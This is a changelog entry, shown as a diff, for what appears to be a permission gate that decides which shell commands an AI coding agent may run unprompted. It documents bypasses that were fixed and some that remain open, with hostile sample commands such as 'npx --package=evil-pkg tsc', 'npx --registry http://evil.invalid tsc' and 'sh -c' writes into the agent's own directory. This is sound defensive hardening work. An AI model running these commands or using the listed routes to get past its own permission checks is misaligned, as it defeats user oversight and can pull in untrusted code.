@@ -1,5 +1,96 @@
 # Changelog
 
+## 3.39.0 — 2026-10-17
+**The bar asks about the thing the command actually touches: the binary, the
+written operand, the fetched package.**
+
+- **What was wrong — three name-based shortcuts, one class.** (1) `argv0` was a
+  *name*: `bin/ls`, `scripts/cat README.md`, `~/Downloads/ls`,
+  `/tmp/evil/git status`, `node_modules/.bin/tsc` matched the allow table by
+  basename while the parser minted no path for the program the shell execs — and
+  the base-bound grant rule (`RELATIVE_PATH_RE`, `./` and `../` only) never saw
+  `bin/ls` either. (2) The manual path asked ONE location question, *may this be
+  READ?*: `~/.pi` is an `allowedReadPath` (skills, extensions), so
+  `mkdir ~/.pi/agent/pwned-dir` and `touch ~/.pi/agent/pwned-file` auto-allowed.
+  (3) A run form's answer to *what does this FETCH?* was the first word after the
+  flags, and its options were three hand-written lists that had already drifted:
+  `npx --package=evil-pkg tsc` (fetches `evil-pkg`, runs `tsc` from inside it)
+  was vouched for by Trust for `tsc`, a package it never fetched; `uv run --color
+  never <skills script>` read `never` as the payload and lost the trusted-script
+  umbrella; `uv run -P pandas <skills script>` folded `-P`
+  (`--upgrade-package`) into `-p` (`--python`) and auto-allowed an install.
+- **The fix — `argv0` (`analysis/argv0-path.ts`).** A program is classified bare
+  / system (the four distro-owned dirs) / path-qualified, per stage against that
+  segment's effective base, computed once so parser, grants, prompt and floor
+  agree. Qualified means the program's own location joins the path set, it
+  matches only an exact base-bound grant, and the signature names the path
+  instead of collapsing it. `command -v /tmp/x` keeps bare-name semantics — a
+  lookup runs nothing; `/usr/local/bin` and `/opt/homebrew/bin` are deliberately
+  NOT system dirs (admin/homebrew-writable is the class).
+- **The fix — write roles (`analysis/write-roles.ts`).** A closed table of
+  operand ROLES (`WRITE_ALL` / `WRITE_LAST` / `WRITE_FIRST` / `WRITE_IN_PLACE` —
+  the verb decides which position is the destination) plus per-command flag
+  tables for destinations that hide in flags (`tar -f`/`--file`, `cp -t`,
+  `sort -o`, `dd of=`, `find -fprint`), the flag-that-switches-the-verb form
+  (`find -delete` ⇒ every walked directory), and tar's extract/create asymmetry.
+  `writePaths ⊆ paths` by construction — minted at the same sites, same filters,
+  one resolution path. The decision layer bars write operands against cwd ∪
+  `allowedWritePaths` ∪ the session's WRITE grants — a READ grant never
+  satisfies one — and the prompt titles `Write` so the Always tier stores
+  `writeDirs`, the click that covers the next run. Closed world: no table entry
+  ⇒ no write operand claimed.
+- **The fix — the runner's closed world (`config/bash-patterns.ts`,
+  `config/trusted-scripts.ts`).** `fetchFormScan` names EVERY package a form
+  selects (`FETCH_PKG_SELECT` per family: npm `{-p,--package}`, uv `{--from}`
+  only — uv's `-p` is `--python` — bun `{--package}` long form), and with a
+  select flag the trailing word is the command run from inside the selected
+  package(s): `npx -p typescript tsc` fetches `typescript` alone. uv's four run
+  forms (`uvx`, `uv x`, `uv tool run`, `uv run`) share one option model over
+  `UV_VALUE_FLAGS` — the arity table generated from uv's own `--help` (83
+  options, 49 value-taking) — and it has three consumers: the fetch scan,
+  `findScriptOperand` and uv's own walk, so a flag's value can never be read as
+  the payload by one of them. Curated classes: flags that cannot change what
+  runs, benign value flags, and the dep flags that face package trust;
+  everything else, including anything the table does not know (an unknown option
+  is ASSUMED to take a value, so the scan can only narrow), voids the umbrella —
+  unknown is never benign. Option values that decide what runs join the grant
+  identity (`uvx --python /tmp/evil/python`, `timeout uv run --with pandas`),
+  and a value the shell has not named yet (`-p "$PKG"`) makes the form
+  ungrantable rather than silently coarse — the prompt says so.
+- **Found on the way and pinned.** G3: tar's dashless bundle (`tar cf out.tar`)
+  claimed no archive; `patch f` named no target; `cp -t DIR a b` claimed `b` as
+  the destination; `skipArgs` was ignored on flag VALUES (`-name x` became a
+  location); `>|` (noclobber) was not a write redirect; `sort -o` reached
+  `allWrites` twice; and the body-write fold placed AFTER the
+  `SAFE_SYSTEM_PATHS` dedup dropped those writes silently. G7: `uv tool run` —
+  the two-word `uvx` — was never fetch-scanned at all, and the floor's stop for
+  `uvx -p /tmp/evil/python tsc` named the python path as a *package*; it now
+  reads `unvetted run-form option (uvx)`.
+- **Measured.** Round-6 reproducer corpus (62 rows): 12 open at 3.38.0 → 6 after
+  G4 → 4 after G3 → **3** now; the three left are G8 (variable shadowing). The
+  31-row location-floor set: 7 stops → **8**, the new stop being
+  `npx --package=evil-pkg tsc` — the hole itself. A frozen replay of 875 unique
+  real logged commands through `decide()` shows **zero** verdict differences
+  3.38.0 → 3.39.0 (the replay carries no grants, so it cannot show the
+  signature-text cost below; 149 of its rows are `npx …` forms and none flip).
+- **Upgrade note (fail closed, one re-prompt).** Pre-3.39.0 grants for uv/uvx
+  forms that carry options change text: `uvx -p`, `uvx --from`, a coarse
+  `uv run`/`uvx` grant in front of an option-valued form, and wrapped
+  `timeout uv run --with …` all re-prompt once. A path-qualified program never
+  matches a basename grant (`ls` does not cover `bin/ls`), and a READ grant
+  never covers a write outside the bar.
+- **Known boundaries, documented not fixed.** A `SHELL_INTERPRETERS` body
+  (`sh -c 'echo > ~/.pi/agent/x'`) mints no paths at all, so neither bar sees it
+  — its command-level grant gates it (`sh`/`bash` are not table-allowed) and
+  under `/dspa` the judge sees the full text. npm-family options beyond the
+  select flags are not vetted by name — but their values land in the fetch set,
+  so the command names a package no Trust can hold and prompts (`npx --registry
+  http://evil.invalid tsc`). And a coarse fetch-form rule still covers
+  npm-family variants: an "Always" on `npx tsc --noEmit` stores `npx tsc`, which
+  prefix-covers `npx --package=evil-pkg tsc` (measured) — deferred as G13, and
+  closed for `uvx` by the signature change.
+- Suite 4237 / 55 files.
+
 ## 3.38.0 — 2026-10-17
 **The stage, not the segment, is what gets approved.**
 
